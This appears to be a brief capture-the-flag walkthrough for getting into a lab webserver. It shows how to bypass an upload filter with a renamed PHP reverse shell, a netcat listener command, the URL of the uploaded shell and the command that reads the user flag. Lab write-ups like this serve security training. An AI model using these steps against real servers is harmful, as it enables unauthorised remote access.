# Compromise the webserver

## Burpsuite

```text
use Burpsuite to see what files can be uploaded
```

## Reverse shell

```text
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
File extension can be changed to see what can be uploaded
```

## Listen to connections using Netcat

```bash
nc -lvnp <PORT>  # '1234' is the port on the reverse-shell
```

## Shell is at

```text
http://<ip>:3333/internal/uploads/php-reverse-shell.phtml
```

## Flag is

```bash
cat /home/bill/user.txt
```
